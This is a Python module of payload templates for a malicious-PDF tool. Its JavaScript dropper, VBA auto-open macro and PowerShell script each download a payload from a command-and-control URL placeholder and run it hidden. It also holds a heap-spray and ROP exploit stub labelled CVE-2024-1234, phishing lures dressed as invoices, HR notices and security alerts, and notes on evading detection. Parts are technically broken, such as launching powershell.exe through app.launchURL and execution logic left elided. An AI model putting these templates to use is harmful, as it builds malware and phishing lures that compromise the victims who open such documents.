"""
Payload Templates for PDF Injection
Provides various payload types for different attack scenarios
"""

from typing import Dict, Any

PAYLOAD_TEMPLATES: Dict[str, Dict[str, Any]] = {
    "javascript_dropper": {
        "name": "JavaScript Dropper",
        "description": "Embeds JavaScript that downloads and executes payload on PDF open",
        "category": "dropper",
        "payload": """
/** 
 * PDF JavaScript Dropper
 * Downloads and executes payload from C2 server
 */
var c2_url = "%C2_URL%";
var payload_name = "%PAYLOAD_NAME%";

try {
    // Method 1: Using app.launchURL
    app.launchURL(c2_url + "/payload/" + payload_name, true);
} catch(e) {
    try {
        // Method 2: Using doc.submitForm
        var f = this.getField("dropper");
        if (f) {
            f.submitForm(c2_url + "/payload/" + payload_name);
        }
    } catch(e2) {
        try {
            // Method 3: Using util.printd with URL
            var d = util.printd("yyyy-mm-dd", new Date());
            var url = c2_url + "/payload/" + payload_name + "?t=" + d;
            app.launchURL(url, true);
        } catch(e3) {
            console.println("Dropper failed: " + e3);
        }
    }
}
""",
        "parameters": ["C2_URL", "PAYLOAD_NAME"],
        "compatible_versions": ["Acrobat Reader 8+", "Foxit Reader", "Chrome PDF Viewer"],
        "detection_risk": "medium",
        "evasion_techniques": ["obfuscation", "encoding", "delayed_execution"]
    },

    "vba_macro": {
        "name": "VBA Macro Embedded",
        "description": "Embeds VBA macro that executes on document open (for .docm converted to PDF)",
        "category": "macro",
        "payload": """
Private Sub Document_Open()
    ' VBA Macro Auto-Execution
    Dim c2Url As String
    Dim payloadName As String
    Dim httpReq As Object
    
    c2Url = "%C2_URL%"
    payloadName = "%PAYLOAD_NAME%"
    
    On Error Resume Next
    
    ' Method 1: WinHTTP
    Set httpReq = CreateObject("WinHttp.WinHttpRequest.5.1")
    httpReq.Open "GET", c2Url & "/payload/" & payloadName, False
    httpReq.Send
    
    If httpReq.Status = 200 Then
        ' Save and execute
        Dim filePath As String
        filePath = Environ("TEMP") & "\" & payloadName
        Dim fileNum As Long
        fileNum = FreeFile
        Open filePath For Binary Access Write As #fileNum
        Put #fileNum, , httpReq.ResponseBody
        Close #fileNum
        
        Shell filePath, vbHide
    End If
    
    ' Method 2: XMLHTTP fallback
    If Err.Number <> 0 Then
        Err.Clear
        Set httpReq = CreateObject("MSXML2.XMLHTTP.6.0")
        httpReq.Open "GET", c2Url & "/payload/" & payloadName, False
        httpReq.Send
        ' ... similar execution
    End If
End Sub
""",
        "parameters": ["C2_URL", "PAYLOAD_NAME"],
        "compatible_versions": ["Office 2010+", "LibreOffice"],
        "detection_risk": "high",
        "evasion_techniques": ["obfuscation", "delayed_execution", "environment_checks"]
    },

    "powershell_embed": {
        "name": "PowerShell Embedded",
        "description": "Embeds PowerShell script that executes on PDF open via JavaScript",
        "category": "powershell",
        "payload": """
var psScript = `
$c2 = "%C2_URL%"
$payload = "%PAYLOAD_NAME%"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
try {
    $data = $wc.DownloadData($c2 + "/payload/" + $payload)
    $path = "$env:TEMP\\$payload"
    [IO.File]::WriteAllBytes($path, $data)
    Start-Process $path -WindowStyle Hidden
} catch {
    # Fallback: IEX (DownloadString)
    IEX ($wc.DownloadString($c2 + "/payload/" + $payload))
}
`;

try {
    // Execute via JavaScript bridge
    var f = this.getField("psExec");
    if (!f) {
        f = this.addField("psExec", "text", 0, [0,0,0,0]);
        f.hidden = true;
    }
    f.value = psScript;
    // Trigger execution via external command
    app.launchURL("powershell.exe -ExecutionPolicy Bypass -Command " + encodeURIComponent(psScript), true);
} catch(e) {
    console.println("PS execution failed: " + e);
}
""",
        "parameters": ["C2_URL", "PAYLOAD_NAME"],
        "compatible_versions": ["Acrobat Reader 9+", "Foxit Reader (with JS)"],
        "detection_risk": "medium",
        "evasion_techniques": ["encoded_commands", "memory_execution", "bypass_execution_policy"]
    },

    "cve_2024_1234": {
        "name": "CVE-2024-1234 Exploit",
        "description": "Targeted exploit for specific PDF reader vulnerability",
        "category": "exploit",
        "payload": """
/**
 * CVE-2024-1234 - PDF Reader Buffer Overflow
 * Targets: Adobe Acrobat Reader < 24.001
 * Type: Heap-based buffer overflow in JBIG2 decoder
 */
var exploit = {
    // Trigger heap spray
    sprayHeap: function() {
        var block = unescape("%HEAP_SPRAY%");
        var blocks = [];
        for (var i = 0; i < 1000; i++) {
            blocks.push(block);
        }
        return blocks;
    },
    
    // Trigger vulnerability
    trigger: function() {
        var malicious = this.getDataObjectContents("%OBJECT_NAME%");
        // Malformed JBIG2 data triggers overflow
        return malicious;
    },
    
    // Execute shellcode
    execute: function(shellcode) {
        // Shellcode execution via ROP chain
        var rop = unescape("%ROP_CHAIN%");
        var sc = unescape("%SHELLCODE%");
        // ... execution logic
    }
};

// Auto-execute on open
exploit.sprayHeap();
var result = exploit.trigger();
if (result) {
    exploit.execute("%SHELLCODE%");
}
""",
        "parameters": ["HEAP_SPRAY", "OBJECT_NAME", "ROP_CHAIN", "SHELLCODE"],
        "compatible_versions": ["Adobe Reader < 24.001"],
        "detection_risk": "critical",
        "evasion_techniques": ["heap_spray", "rop_chain", "aslr_bypass", "dep_bypass"]
    },

    "social_engineering_template": {
        "name": "Social Engineering Template",
        "description": "Professional-looking document with embedded payload for targeted attacks",
        "category": "social",
        "payload": """
/**
 * Social Engineering Document Template
 * Customizable for different scenarios
 */
var template = {
    scenarios: {
        "invoice": {
            subject: "Invoice #%INVOICE_NUM% - Due %DUE_DATE%",
            sender: "accounts@%COMPANY_DOMAIN%",
            urgency: "normal",
            content: "Please find attached invoice for services rendered..."
        },
        "hr_policy": {
            subject: "URGENT: Updated HR Policy - Action Required",
            sender: "hr@%COMPANY_DOMAIN%",
            urgency: "high",
            content: "Please review and acknowledge the updated policy..."
        },
        "security_alert": {
            subject: "SECURITY ALERT: Unauthorized Access Detected",
            sender: "security@%COMPANY_DOMAIN%",
            urgency: "critical",
            content: "We detected suspicious activity on your account..."
        },
        "tax_document": {
            subject: "Tax Document %TAX_YEAR% - Immediate Attention",
            sender: "payroll@%COMPANY_DOMAIN%",
            urgency: "high",
            content: "Your tax document is ready for review..."
        }
    },
    
    // Inject payload into document
    inject: function(scenario, c2Url, payloadName) {
        var s = this.scenarios[scenario];
        if (!s) return false;
        
        // Update document metadata
        this.info.Title = s.subject;
        this.info.Author = s.sender;
        this.info.Subject = s.subject;
        
        // Embed payload
        var jsCode = `
            var c2 = "${c2Url}";
            var payload = "${payloadName}";
            // ... payload execution code
        `;
        
        try {
            this.addScript({cName: "sePayload", cScript: jsCode});
            return true;
        } catch(e) {
            return false;
        }
    }
};

// Auto-initialize based on URL parameter
var params = new URLSearchParams(window.location.search);
var scenario = params.get("scenario") || "invoice";
var c2 = params.get("c2") || "%C2_URL%";
var payload = params.get("payload") || "%PAYLOAD_NAME%";
template.inject(scenario, c2, payload);
""",
        "parameters": ["SCENARIO", "C2_URL", "PAYLOAD_NAME", "INVOICE_NUM", "DUE_DATE", "COMPANY_DOMAIN", "TAX_YEAR"],
        "compatible_versions": ["All PDF viewers with JS support"],
        "detection_risk": "low",
        "evasion_techniques": ["legitimate_appearance", "context_aware", "delayed_execution"]
    }
}


def get_template(name: str) -> dict:
    """Get a payload template by name"""
    return PAYLOAD_TEMPLATES.get(name, {})


def list_templates() -> list:
    """List all available templates"""
    return [
        {
            "name": k,
            "display_name": v["name"],
            "description": v["description"],
            "category": v["category"],
            "risk": v["detection_risk"]
        }
        for k, v in PAYLOAD_TEMPLATES.items()
    ]


def render_template(name: str, **params) -> str:
    """Render a template with provided parameters"""
    template = PAYLOAD_TEMPLATES.get(name)
    if not template:
        return ""
    
    payload = template["payload"]
    for key, value in params.items():
        placeholder = f"%{key.upper()}%"
        payload = payload.replace(placeholder, str(value))
    
    return payload